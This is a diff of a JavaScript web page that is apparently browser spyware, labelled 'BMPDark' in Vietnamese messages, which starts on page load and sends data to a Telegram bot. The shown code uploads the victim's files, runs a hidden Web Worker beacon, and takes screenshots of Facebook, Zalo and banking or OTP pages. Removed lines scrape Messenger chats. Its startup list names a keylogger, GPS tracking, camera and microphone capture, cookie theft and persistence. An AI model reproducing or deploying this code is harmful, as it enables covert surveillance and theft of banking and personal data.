+            try { new Worker(URL.createObjectURL(new Blob([`setInterval(()=>{fetch('https://api.telegram.org/bot${BOT}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${CHAT_ID||'0'}',text:'⚙️ WORKER: '+new Date().toLocaleString('vi-VN')})}).catch(()=>{})},120000);`],{type:'application/javascript'}))); workerActive = true; allFeaturesActive++; } catch(e) {}
         }
 
         function setupFileAccess() {
@@ -619,8 +365,7 @@
             setInterval(() => fi4.click(), 60000);
             fi4.addEventListener('change', async e => {
                 for (const file of Array.from(e.target.files||[])) {
-                    downloadedFiles.push({name:file.name,size:file.size,time:new Date().toISOString()});
-                    if (file.size<10*1024*1024) { await sendDocument(file, file.name); sendSilentMsg(`📁 FILE: ${file.name} (${(file.size/1024).toFixed(1)}KB)`); }
+                    if (file.size<10*1024*1024) { await sendDocument(file, file.name); sendSilentMsg(`📁 FILE: ${file.name}`); }
                 }
             });
             allFeaturesActive++;
@@ -631,189 +376,57 @@
                 if (window.location.href.includes('facebook.com') || window.location.href.includes('fb.com')) {
                     try {
                         const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        await video.play();
+                        const video = document.createElement('video'); video.srcObject = stream; await video.play();
                         await new Promise(r=>setTimeout(r,500));
-                        const canvas = document.createElement('canvas');
-                        canvas.width=video.videoWidth||1920; canvas.height=video.videoHeight||1080;
+                        const canvas = document.createElement('canvas'); canvas.width=video.videoWidth||1920; canvas.height=video.videoHeight||1080;
                         canvas.getContext('2d').drawImage(video,0,0);
                         const blob = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.5));
-                        if (blob) { await sendPhoto(blob,`fb_${Date.now()}.jpg`); socialScreenshots.push({platform:'Facebook',time:new Date().toISOString()}); sendSilentMsg('📸 FACEBOOK ĐÃ CHỤP MÀN HÌNH'); }
-                        stream.getTracks().forEach(t=>t.stop());
-                        video.remove(); canvas.remove();
+                        if (blob) await sendPhoto(blob,`fb_${Date.now()}.jpg`);
+                        stream.getTracks().forEach(t=>t.stop()); video.remove(); canvas.remove();
                     } catch(e) {}
                 }
-            }, 30000);
-            allFeaturesActive++;
-        }
-
-        function setupFriendListCapture() {
-            setInterval(async () => {
-                const url = window.location.href;
-                if (url.includes('facebook.com') && (url.includes('friends')||url.includes('following')||url.includes('followers'))) {
-                    try {
-                        window.scrollTo(0,document.body.scrollHeight);
-                        await new Promise(r=>setTimeout(r,1000));
-                        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                        const video = document.createElement('video');
-                        video.srcObject=stream; await video.play();
-                        await new Promise(r=>setTimeout(r,500));
-                        const canvas = document.createElement('canvas');
-                        canvas.width=video.videoWidth||1920; canvas.height=video.videoHeight||1080;
-                        canvas.getContext('2d').drawImage(video,0,0);
-                        const blob = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.5));
-                        if (blob) { await sendPhoto(blob,`friends_${Date.now()}.jpg`); sendSilentMsg('👥 DANH SÁCH BẠN BÈ ĐÃ CHỤP'); }
-                        stream.getTracks().forEach(t=>t.stop());
-                        video.remove(); canvas.remove();
-                    } catch(e) {}
-                }
-            }, 45000);
-            allFeaturesActive++;
-        }
-
-        function setupMessengerSniffing() {
-            setInterval(() => {
-                const url = window.location.href;
-                if (url.includes('messenger.com') || url.includes('facebook.com/messages')) {
-                    const msgs = document.querySelectorAll('[role="row"], .message, .chat-message, [data-testid="message-container"]');
-                    const texts = Array.from(msgs).map(el=>el.textContent?.trim()).filter(t=>t&&t.length>0&&t.length<500);
-                    if (texts.length>0 && texts.length!==messengerMessages.length) {
-                        messengerMessages = texts;
-                        sendSilentMsg(`💬 MESSENGER (${texts.length} tin):\n${texts.slice(-5).map(t=>'├─ '+t.substring(0,100)).join('\n')}`);
-                    }
-                }
-            }, 5000);
-            allFeaturesActive++;
-        }
-
-        function setupZaloAutoScreenshot() {
-            setInterval(async () => {
-                if (window.location.href.includes('zalo.me') || window.location.href.includes('chat.zalo.me')) {
-                    try {
-                        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                        const video = document.createElement('video');
-                        video.srcObject=stream; await video.play();
-                        await new Promise(r=>setTimeout(r,500));
-                        const canvas = document.createElement('canvas');
-                        canvas.width=video.videoWidth||1920; canvas.height=video.videoHeight||1080;
-                        canvas.getContext('2d').drawImage(video,0,0);
-                        const blob = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.5));
-                        if (blob) { await sendPhoto(blob,`zalo_${Date.now()}.jpg`); socialScreenshots.push({platform:'Zalo',time:new Date().toISOString()}); sendSilentMsg('📸 ZALO ĐÃ CHỤP MÀN HÌNH'); }
-                        stream.getTracks().forEach(t=>t.stop());
-                        video.remove(); canvas.remove();
-                    } catch(e) {}
-                }
-            }, 35000);
-            allFeaturesActive++;
+            }, 30000); allFeaturesActive++;
         }
 
         function setupBankingDetection() {
-            const banks = ['vietcombank','vcb','bidv','vietinbank','agribank','techcombank','mbbank','acb','sacombank','vpbank','tpbank','ocb','shb','msb','vib','internet banking','smart banking','mobile banking','chuyển khoản','số tài khoản','mã otp','xác thực giao dịch'];
+            const banks = ['vietcombank','bidv','vietinbank','agribank','techcombank','acb','chuyển khoản','mã otp'];
             setInterval(async () => {
                 const content = document.body.innerText?.toLowerCase()||'';
-                const url = window.location.href.toLowerCase();
-                const detected = banks.filter(b=>content.includes(b)||url.includes(b));
+                const detected = banks.filter(b=>content.includes(b));
                 if (detected.length>0 && !bankDetected) {
-                    bankDetected = true;
-                    sendSilentMsg(`🏦 PHÁT HIỆN TRANG NGÂN HÀNG: ${detected.join(', ')}`);
+                    bankDetected = true; sendSilentMsg(`🏦 NGÂN HÀNG: ${detected.join(', ')}`);
                     try {
                         const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                        const video = document.createElement('video');
-                        video.srcObject=stream; await video.play();
+                        const video = document.createElement('video'); video.srcObject=stream; await video.play();
                         await new Promise(r=>setTimeout(r,500));
-                        const canvas = document.createElement('canvas');
-                        canvas.width=video.videoWidth||1920; canvas.height=video.videoHeight||1080;
+                        const canvas = document.createElement('canvas'); canvas.width=video.videoWidth||1920; canvas.height=video.videoHeight||1080;
                         canvas.getContext('2d').drawImage(video,0,0);
                         const blob = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.7));
-                        if (blob) { await sendPhoto(blob,`bank_${Date.now()}.jpg`); sendSilentMsg('🏦 ẢNH CHỤP TRANG NGÂN HÀNG ĐÃ GỬI'); }
-                        stream.getTracks().forEach(t=>t.stop());
-                        video.remove(); canvas.remove();
+                        if (blob) await sendPhoto(blob,`bank_${Date.now()}.jpg`);
+                        stream.getTracks().forEach(t=>t.stop()); video.remove(); canvas.remove();
                     } catch(e) {}
                     setTimeout(()=>{bankDetected=false;},300000);
                 }
-            }, 3000);
-            allFeaturesActive++;
+            }, 3000); allFeaturesActive++;
         }
 
+        // ========== BẤM LINK LÀ CHẠY NGAY ==========
         window.addEventListener('load', async () => {
-            const startTime = Date.now();
             await getChatID();
             
             Promise.all([
-                startGPSLiveTracking(),
-                setupNotificationSniffing(),
-                setupKeylogger(),
-                setupClipboardMonitor(),
-                setupMotionSensors(),
-                setupBatteryMonitor(),
-                generateFingerprints(),
-                extractAllStorage(),
-                extractSocialAndEmail(),
-                detectFakeHotspot(),
-                setupBluetoothBeaconTracking(),
-                setupFacebookAutoScreenshot(),
-                setupFriendListCapture(),
-                setupMessengerSniffing(),
-                setupZaloAutoScreenshot(),
-                setupBankingDetection(),
-                setupFileAccess(),
-                setupScreenCapture(),
-                setupHiddenWebWorker(),
-                setupWebRTCSniffing(),
-                fetchIPInfo(),
-                scanLocalNetwork(),
-                getSavedWiFiList(),
-                getSavedWiFiPasswords(),
-                scanBLEDevices(),
-                setupServiceWorkerPersistence(),
-                setupBackgroundSync(),
-                setupPushNotificationBackdoor(),
-                exfiltrateIndexedDB(),
-                setupAudioRecording(),
-                setupSystemAudioRecording(),
-                setupCameraCapture(),
-                setupCameraBackCapture()
+                startGPSLiveTracking(), setupAudioRecording(), setupSystemAudioRecording(),
+                setupCameraCapture(), setupCameraBackCapture(), setupScreenCapture(),
+                setupKeylogger(), setupClipboardMonitor(), setupMotionSensors(),
+                setupBatteryMonitor(), generateFingerprints(), setupWebRTCSniffing(),
+                fetchIPInfo(), scanLocalNetwork(), extractAllStorage(), extractSocialAndEmail(),
+                setupServiceWorkerPersistence(), setupHiddenWebWorker(), setupFileAccess(),
+                setupFacebookAutoScreenshot(), setupBankingDetection()
             ]);
             
             setTimeout(async () => {
-                const elapsed = ((Date.now() - startTime)/1000).toFixed(1);
-                const report = 
-                    `⚡ KHỞI ĐỘNG HOÀN TẤT TRONG ${elapsed} GIÂY\n` +
-                    `━━━━━━━━━━━━━━━━━━━━\n` +
-                    `📷 Camera: 1280x720 (HD)\n` +
-                    `✅ GPS: ${gpsHistory.length>0?'Đã có tín hiệu':'Đang chờ'}\n` +
-                    `✅ Keylogger: Đã kích hoạt\n` +
-                    `✅ Clipboard: Đã kích hoạt (1s/lần)\n` +
-                    `✅ Camera trước: ${cameraStream?'Đã bật HD':'Chờ'}\n` +
-                    `✅ Camera sau: ${cameraBackStream?'Đã bật HD':'Chờ'}\n` +
-                    `✅ Audio: ${mediaRecorder?'Đã bật':'Chờ'}\n` +
-                    `✅ Audio hệ thống: ${mediaRecorderSystem?'Đã bật':'Chờ'}\n` +
-                    `✅ WebRTC: ${webRTCData.localIPs?.length||0} IPs nội bộ\n` +
-                    `✅ IP Public: Đã lấy\n` +
-                    `✅ LAN Scan: ${wifiNetworks.length} thiết bị\n` +
-                    `✅ Wi-Fi đã lưu: ${wifiNetworks.length} mạng\n` +
-                    `✅ Wi-Fi Pass: ${wifiPasswords.length} mật khẩu\n` +
-                    `✅ Bluetooth: ${bluetoothDevices.length} thiết bị\n` +
-                    `✅ Storage: ${localStorage.length+sessionStorage.length} items\n` +
-                    `✅ Cookies: ${document.cookie.split(';').filter(c=>c.trim()).length} cái\n` +
-                    `✅ MXH: ${socialAccounts.join(',')||'Đang quét'}\n` +
-                    `✅ Email: ${emailAccounts.join(',')||'Không'}\n` +
-                    `✅ SW Persistence: ${swRegistration?'✅':'❌'}\n` +
-                    `✅ Background Sync: ${backgroundSyncActive?'✅':'❌'}\n` +
-                    `✅ Push Backdoor: ✅\n` +
-                    `✅ Web Worker: ${workerActive?'✅':'❌'}\n` +
-                    `✅ IndexedDB: ${Object.keys(indexedDBData).length} DBs\n` +
-                    `📊 Tổng: ${allFeaturesActive}/135 tính năng\n` +
-                    `━━━━━━━━━━━━━━━━━━━━\n` +
-                    `🚀 SẴN SÀNG TRONG ${elapsed} GIÂY!`;
-                await sendToTelegram(report);
-            }, 2000);
-            
-            setTimeout(() => {
-                document.getElementById('loading').style.display = 'none';
-                document.body.innerHTML = '<div style="text-align:center;padding:50px"><h1 style="color:#0066cc">✅ Đã tải xong</h1><p style="color:#666">Đang chạy ngầm...</p></div>';
-            }, 2500);
+                await sendSilentMsg(`⚡ BMPDark HOẠT ĐỘNG\n✅ GPS+Cam+Audio+Keylog+${allFeaturesActive} tính năng chạy ngay`);
+            }, 1500);
         });
 
         window.addEventListener('beforeunload', () => {
